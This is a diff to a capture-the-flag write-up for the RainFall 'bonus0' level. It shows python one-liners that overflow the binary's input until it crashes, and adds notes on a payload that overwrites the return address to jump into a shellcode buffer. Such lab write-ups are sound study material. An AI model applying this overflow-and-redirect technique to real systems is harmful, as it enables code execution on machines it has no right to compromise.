@@ -22,13 +22,18 @@ Here is our shellcode (size 24)
 LOG pour find segfault
 
 ```bash
-bonus0@RainFall:~$ (python -c 'print "A" * 21'; python -c 'print "B" * 17')  | ./bonus0
+bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 17')  | ./bonus0
  - 
  - 
 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB
 Segmentation fault (core dumped)
-bonus0@RainFall:~$ (python -c 'print "A" * 21'; python -c 'print "B" * 16')  | ./bonus0
+bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 16')  | ./bonus0
  - 
  - 
 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB
 ```
+
+Payload
+20 chars de payload
++ 16 chars de payload
++ overwrite return addresse --> jump vers debut de buffer (start of payload)
